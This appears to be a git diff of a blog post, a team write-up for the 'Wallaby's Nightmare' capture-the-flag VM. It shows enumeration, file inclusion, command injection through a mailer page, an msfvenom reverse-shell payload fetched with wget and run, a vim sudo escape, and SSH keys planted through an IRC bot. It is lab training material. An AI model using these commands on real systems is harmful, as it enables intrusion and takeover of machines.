@@ -86,6 +86,7 @@ host             port  proto  name  state     info
 192.168.167.133  22    tcp    ssh   open      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 Ubuntu Linux; protocol 2.0
 192.168.167.133  80    tcp    http  open      Apache httpd 2.4.18 (Ubuntu)
 192.168.167.133  6667  tcp    irc   filtered
+
 {{< / highlight >}}
 
 ### HTTP
@@ -97,6 +98,7 @@ Since there's only two services that are fully open (HTTP and SSH), we started w
 A nikto scan quickly caused port 80 to be closed!
 
 {{< highlight markdown >}}
+
 root@kali:~# nikto -host target
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -117,12 +119,15 @@ root@kali:~# nikto -host target
 + Scan terminated:  20 error(s) and 6 item(s) reported on remote host
 + End Time:           2019-05-01 20:09:21 (GMT-4) (5 seconds)
 ---------------------------------------------------------------------------
+
 {{< / highlight >}}
 
 In further exploration, we would eventually figure out that it was this request that caused the port to close:
 
 {{< highlight markdown >}}
+
  + /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+
 {{< / highlight >}}
 
 The blurb mentions that the machine becomes more difficult if you make a misstep. I think that's debatable, but we will get to the details shortly. For now, let's continue enumeration.
@@ -132,6 +137,7 @@ The blurb mentions that the machine becomes more difficult if you make a misstep
 We started doing more manual exploration, beginning with a revisit to the source of '`/`'. The following script and title is all over the place and is snipped out of later examples in this post.
 
 {{< highlight markdown >}}
+
 <title>Wallaby's Server</title>
 <script>function post(path, params, method) {
 method = method || "post"; // Set method to post by default if not specified.
@@ -157,11 +163,13 @@ form.submit();
 <input type="text" name="yourname" value="" />
 <input type="submit" name="submit" value="Submit" />
 </form>
+
 {{< / highlight >}}
 
 The next thing I decided to do was to click through, and see what we could find.
 
 {{< highlight markdown >}}
+
 Your username for this ctf is ctlfish
 click here to change your username:
 Welcome to the Wallaby's Worst Knightmare 2 part series VM.
@@ -171,6 +179,7 @@ A few tips.
 3. Your environment matters.
 Good luck and have fun! -Waldo
 Start the CTF!
+
 {{< / highlight >}}
 
 So now I did the obvious thing and clicked "Start the CTF!"
@@ -178,17 +187,20 @@ So now I did the obvious thing and clicked "Start the CTF!"
 {{< highlight markdown >}}
 What the heck is this? Some guy named ctlfish is trying to penetrate my server? Loser must not know I'm the great Wallaby!
 Let's observe him for now, maybe I could learn about him from his behavior. 
+
 {{< / highlight >}}
 
 We took a look at the source, and it's very similar to the landing page.
 
 {{< highlight markdown >}}
+
 <html><head><title>Wallaby's Server</title>
 ...
 </head><body><p style="text-align:center;">What the heck is this?  Some guy named <em>ctlfish
 </em> is trying to penetrate my server?  Loser must not know I'm the great Wallaby!</p>
 <br><p style="text-align:center;">Let's <strong><em>observe</em></strong> him for now, maybe I could learn about him from his behavior. <br>
 <img src="/eye.jpg"></p></body></html>
+
 {{< / highlight >}}
 
 We grabbed the image and "Giuseppe" and "SteveyDevey" examined it with strings and tried some brute force attacks with steghide, but it turned out to be a dead end.
@@ -196,6 +208,7 @@ We grabbed the image and "Giuseppe" and "SteveyDevey" examined it with strings a
 I continued manually exploring via the form, and started to see some interesting things. When I tried a local file inclusion to grab /etc/passwd, I got a snarky response from wallaby.
 
 {{< highlight markdown >}}
+
 root@kali:~/src/wallaby# curl  http://wallaby/?page=../../../etc/passwd
 ...
 root:x:0:0:root:/root:/bin/bash
@@ -224,16 +237,19 @@ mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
 steven?:x:1001:1001::/home/steven?:/bin/bash
 ircd:x:1003:1003:,,,:/home/ircd:/bin/bash<!--This is what we call 'dis-information' in the cyber security world!  Are you learning anything new here ?-->
 root@kali:~/src/wallaby# 
+
 {{< / highlight >}}
 
 We also tried a different file inclusion, with a URL we discovered via dirb, and got a different snarky message, which also changed the behavior of the machine!
 
 {{< highlight markdown >}}
+
 root@kali:~/src/wallaby# curl target/?page=.git/config
 ...
 <h2>That's some fishy stuff you're trying there <em></em>buddy.  You must think Wallaby codes like a monkey!  I better get to securing this SQLi though...</h2>
          <br />(Wallaby caught you trying an LFI, you gotta be sneakier!  Difficulty level has increased.)
 root@kali:~/src/wallaby# 
+
 {{< / highlight >}}
 
 After this response, port 80 stopped responding. "Matato" enumerated with nmap again, and discovered that apache had moved to port 60080. Remember how scanning with `nikto` caused port 80 to close? It was a similar query. "Matato" reverted a couple times and confirmed the cause.
@@ -244,6 +260,7 @@ After this response, port 80 stopped responding. "Matato" enumerated with nmap a
 Here's the new nmap output after triggering the change
 
 {{< highlight markdown >}}
+
 msf5 > db_nmap -sV -O -A -T3 -p- wallaby
 [*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 22:08 EDT
 [*] Nmap: Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
@@ -275,6 +292,7 @@ msf5 > db_nmap -sV -O -A -T3 -p- wallaby
 [*] Nmap: 1   1.13 ms wallaby (192.168.56.105)
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
+
 {{< / highlight >}}
 
 ### Fuzzing
@@ -282,6 +300,7 @@ msf5 > db_nmap -sV -O -A -T3 -p- wallaby
 We did some fuzzing with wfuzz, and started to see some patterns in the output. By now, we were working the script directly, a php router, and knew what happens when we try a LFI. I saw a pattern in wfuzz and removed the slew of results that had the same number of words, and this got a list of URLs that actually did something unique.
 
 {{< highlight markdown >}}
+
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 target/?page=FUZZ | grep -v 891
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -306,6 +325,7 @@ Processed Requests: 950
 Filtered Requests: 0
 Requests/sec.: 347.0143
 
+
 {{< / highlight >}}
 
 We started to examine these more closely, and although triggering the LFI response moves the apache instance, once that happens you can just hammer it without any additional consequence, so that's what "Matato" did.
@@ -313,17 +333,20 @@ We started to examine these more closely, and although triggering the LFI respon
 First, there's a telling change in the generic response once apache moves to 60080
 
 {{< highlight markdown >}}
+
 curl http://wallaby:60080/
 <title>Wallaby's Server</title>
 ...
 <p style="text-align:center;">HOLY MOLY, this guy <em></em>wants me...Glad I moved to a different port so I could work more securely!!!</p>
 <br /><p style="text-align:center;">As we all know, <strong><em>security by obscurity</em></strong> is the way to go...<br />
 <img src="/sec.png"/></p>
+
 {{< / highlight >}}
 
 Around this time, everybody was racing with their favorite fuzzer to figure out what vectors were available. "Matato" dropped a list of pages in our notes, which included the "mailer" page.
 
 {{< highlight markdown >}}
+
 # dirb http://wallaby:60080/?page= /usr/share/dirb/wordlists/big.txt
 
 -----------------
@@ -347,22 +370,26 @@ GENERATED WORDS: 20458
 + http://wallaby:60080/?page=index (CODE:200|SIZE:1053)                                            	 
 + http://wallaby:60080/?page=mailer (CODE:200|SIZE:1077)
 
+
 {{< / highlight >}}
 
 With some manual inspection of the mailer page, I found our entry point
 
 {{< highlight markdown >}}
+
 root@kali:~/wallaby# curl  'http://wallaby/?page=mailer&mail=id'
 ...
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <h2 style='color:blue;'>Coming Soon guys!</h2>
 <!--a href='/?page=mailer&mail=mail wallaby "message goes here"'><button type='button'>Sendmail</button-->
 <!--Better finish implementing this so  can send me all his loser complaints!-->
+
 {{< / highlight >}}
 
 We have remote command execution!
 
 {{< highlight markdown >}}
+
 root@kali:~/wallaby# curl  'http://wallaby/?page=mailer&mail=ls%20-R'
 ...
 .:
@@ -382,11 +409,13 @@ index.php
 mailer.php
 welcome.php
 ...
+
 {{< / highlight >}}
 
 We tinkered with this manually to explore things, getting a list of running processes and so on. It didn't take long for that to become tedious, so we whipped up a trivial Python script to make things easier.
 
 {{< highlight markdown >}}
+
 root@kali:~/wallaby# cat ~/src/wallaby/pcurl.py 
 #!/usr/bin/env python3
 
@@ -409,6 +438,7 @@ if args.sendit:
     print(r.text, "\n", r.status_code)
 else:
     print(html_form_value)
+
 {{< / highlight >}}
 
 ## Getting a Foothold
@@ -416,6 +446,7 @@ else:
 Now we have a vector for attack, and we need to get a more firm foothold as the www-data user. First we tried to attack PHP, because it's PHP, and appeared to be an older version, and possibly misconfigured. We didn't make much progress though, even though it was now _very easy_ to run commands against the box.
 
 {{< highlight markdown >}}
+
 root@kali:~/wallaby# ~/src/wallaby/pcurl.py -s -c 'ls -lR'
 ...
 .:
@@ -441,6 +472,7 @@ total 36
 <!--Better finish implementing this so  can send me all his loser complaints!-->
 200
 root@kali:~/wallaby# 
+
 {{< / highlight >}}
 
 ## Getting a Meterpreter Shell
@@ -450,7 +482,9 @@ It was time to stop messing around and get into this thing, so here's a step by 
 ### First we make a payload
 
 {{< highlight markdown >}}
+
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.167.130 LPORT=4444 -f elf -e x86/shikata_ga_nai -a x86 --platform linux -o revshell
+
 {{< / highlight >}}
 
 There's a lot going on there; what, exactly, is this command?
@@ -482,6 +516,7 @@ Next, fetch the payload from yourself, and chmod it to make executable.
 {{< highlight markdown >}}
 ~/src/wallaby/pcurl.py -s -c 'wget 192.168.167.130:8000/revshell'
 ~/src/wallaby/pcurl.py -s -c 'chmod a+x revshell'
+
 {{< / highlight >}}
 
 ### Start a local handler
@@ -489,6 +524,7 @@ Next, fetch the payload from yourself, and chmod it to make executable.
 For the next step, we use the exploit/multi/handler module. It is crucial to set the payload options to match _exactly_ what was generated with msfvenom. Then simply run via `run` or `exploit`
 
 {{< highlight markdown >}}
+
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
 payload => linux/x86/meterpreter/reverse_tcp        
@@ -518,6 +554,7 @@ Exploit target:
 msf5 exploit(multi/handler) > set LHOST 192.168.167.130
 LHOST => 192.168.167.130
 msf5 exploit(multi/handler) > run
+
 {{< / highlight >}}
 
 ### Call the exploit and watch your meterpreter shell
@@ -525,12 +562,16 @@ msf5 exploit(multi/handler) > run
 In another terminal, run the following command to remotely execute our staged payload.
 
 {{< highlight markdown >}}
+
+
 root@kali:~/wallaby# ~/src/wallaby/pcurl.py -s -c './revshell'  
+
 {{< / highlight >}}
 
 Back in msfconsole, we see the target connect to our handler.
 
 {{< highlight markdown >}}
+
 msf5 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 192.168.167.130:4444
 [*] Sending stage (985320 bytes) to 192.168.167.133
@@ -539,6 +580,7 @@ msf5 exploit(multi/handler) > run
 meterpreter > getuid
 Server username: uid=33, gid=33, euid=33, egid=33
 meterpreter >
+
 {{< / highlight >}}
 
 Congratulations! You've got a meterpreter shell! :D
@@ -548,6 +590,7 @@ Congratulations! You've got a meterpreter shell! :D
 Now that we've got a meterpreter shell as the `www-data` user, we were able to do some exploring. We downloaded php files for examination, and checked out what sudo commands were available to the `www-data` user.
 
 {{< highlight markdown >}}
+
 meterpreter > channel -i 2
 Interacting with channel 2...
 
@@ -561,6 +604,7 @@ Matching Defaults entries for www-data on ubuntu:
 User www-data may run the following commands on ubuntu:
     (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
     (ALL) NOPASSWD: /sbin/iptables
+
 {{< / highlight >}}
 
 This shows us how to become the user `waldo` with a vim escape from a `www-data` shell.
@@ -572,10 +616,12 @@ With the information we just gathered, as `www-data`, we run the following comma
 `:shell`Now we are waldo, as we can see in the following commands
 
 {{< highlight markdown >}}
+
 whoami
 waldo
 id
 uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+
 {{< / highlight >}}
 
 We still have a terrible shell though, because `shell -t` as the `www-data` user failed from meterpreter (and we had to fallback to just `shell`); this is because `www-data` user is not allowed to have a tty. Now that we have access as the user `waldo`, let's get a tty.
@@ -585,6 +631,7 @@ We still have a terrible shell though, because `shell -t` as the `www-data` user
 To do this, we make the .ssh directory in waldo's home, echo out an ssh pubkey to the `~waldo/.ssh/authorized_keys` and chown it 600. Now we can simply ssh as `waldo`.
 
 {{< highlight markdown >}}
+
 root@kali:~# ssh waldo@wallaby 
 Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
 
@@ -600,6 +647,7 @@ waldo@ubuntu:~$
 While doing our initial exploration, remember how we found some tips?
 
 {{< highlight markdown >}}
+
 Welcome to the Wallaby's Worst Knightmare 2 part series VM.
 A few tips.
 1. Fuzzing is your friend.
@@ -607,16 +655,19 @@ A few tips.
 3. Your environment matters.
 Good luck and have fun! -Waldo
 Start the CTF!
+
 {{< / highlight >}}
 
 The tips for this CTF included a hint about tmux being useful. Once we become `waldo`, it's easy to see what he is running, since there is a script for running irssi in waldo's home directory. That script starts irssi in a tmux session.
 
 {{< highlight markdown >}}
+
 waldo@ubuntu:~$ cat irssi.sh 
 #!/bin/bash
 tmux new-session -d -s irssi
 tmux send-keys -t irssi 'n' Enter
 tmux send-keys -t irssi 'irssi' Enter
+
 {{< / highlight >}}
 
 Running `tmux list-sessions` shows only the single session named `irssi`, so we attached to it and started to explore.
@@ -626,6 +677,7 @@ Running `tmux list-sessions` shows only the single session named `irssi`, so we 
 We spent some time remembering how to use irssi. I haven't run it for years, even though it used to be a daily driver. Eventually we remembered how to list windows, and found `#wallabyschat`.
 
 {{< highlight markdown >}}
+
 18:06 -!- waldo [waldo@wallaby-DCED2AAD] has joined #wallabyschat
 18:06 [Users #wallabyschat]
 18:06 [@waldo] 
@@ -633,6 +685,7 @@ We spent some time remembering how to use irssi. I haven't run it for years, eve
 18:06 -!- Channel #wallabyschat created Wed May  1 18:06:18 2019
 18:06 -!- Irssi: Join to #wallabyschat was synced in 7 secs
 18:06 -!- wallabysbot [sopel@wallaby-DCED2AAD] has joined #wallabyschat
+
 {{< / highlight >}}
 
 "SteveyDevey" noticed the join message for `wallabysbot`. We played around with the bot and found the `.run` command, which failed on anything other than single arg invocations, but also runs those things as wallaby, which we confirmed by running `id`.
@@ -644,6 +697,7 @@ We spent some time remembering how to use irssi. I haven't run it for years, eve
 So, after digging a bit with irssi,  wallaby's `.run` custom sopel module will only accept a single arg. This is because `trigger.group(2)` is the a python regex object `match.group` that's part of the [sopel framework](https://sopel.chat/tutorials/part-1-writing-modules/), which defines `trigger.group(2)` as "anything after the command" (as in the command to the bot). So our module won't accept any sort of command with multiple args, because the string in `trigger.group(2)` is passed to this simple module, which uses the old `'%s'` style of python string formatting when it, in turn, calls `os.system()` and also `subprocess.Popen()`, which both need tokenization of args, not just a raw string. We tried faking the format of our commands in [the format expected](https://docs.python.org/3/library/subprocess.html#subprocess.run), but that didn't work. We took a break because it was late and we all had real life stuff to do the next day.
 
 {{< highlight markdown >}}
+
 waldo@ubuntu:/home/wallaby/.sopel/modules$ cat run.py 
 import sopel.module, subprocess, os
 from sopel.module import example
@@ -658,6 +712,7 @@ def run(bot, trigger):
           bot.say(' '.join(runas.split('\\n')))
      else:
           bot.say('Hold on, you aren\'t Waldo?')
+
 {{< / highlight >}}
 
 I was thinking about this before bed, and thought we might be overthinking it. What about a much simpler solution? I dropped this idea in our shared notes.
@@ -667,21 +722,25 @@ I was thinking about this before bed, and thought we might be overthinking it. W
 In the morning,"Matato" lit up our chat after he ran with the idea to create a script and run it as the single arg to `.run` so that `waldo` can execute code as `wallaby`. Here's my script. "Matato", independently did the nearly the exact same thing; he beat me in the keyboard race. :)
 
 {{< highlight markdown >}}
+
 waldo@ubuntu:~$ cat test 
 #!/bin/bash
 sudo -l
 mkdir /home/wallaby/.ssh
 echo "ssh-rsa AAAAB3NzaC1yc2NNNICETRYMORTY9a42+m7rFv root@kali" >> /home/wallaby/.ssh/authorized_keys
 chmod 600 /home/wallaby/.ssh/authorized_keys
+
 {{< / highlight >}}
 
 I thought we might need to put this in a neutral place like `/var/www/html` or something, but because the permissions on home are `755` instead of `700`, we can just run this from `waldo`'s home!
 
 {{< highlight markdown >}}
+
 22:03 < waldo> .run /home/waldo/test
 22:03 < wallabysbot> b'Matching Defaults entries for wallaby on ubuntu:     env_reset, mail_badpass, 
                      secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User wallaby may run the following commands on ubuntu:     
                      (ALL) NOPASSWD: ALL '
+
 {{< / highlight >}}
 
 This appended our key do wallaby's home, so now we just ssh as `wallaby` and `sudo su -`!
@@ -689,6 +748,7 @@ This appended our key do wallaby's home, so now we just ssh as `wallaby` and `su
 ## Flag
 
 {{< highlight markdown >}}
+
 root@kali:~# ssh wallaby@wallaby 
 Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
 
@@ -773,6 +833,4 @@ Arelle Mitkowski as Coffee Shop Customer # 3<br />
 Frank Willey as Coffee Shop Customer # 4<br />
 Amy Von Brock as Party Member # 5 (uncredited)<br />
 </p>
-
-
 
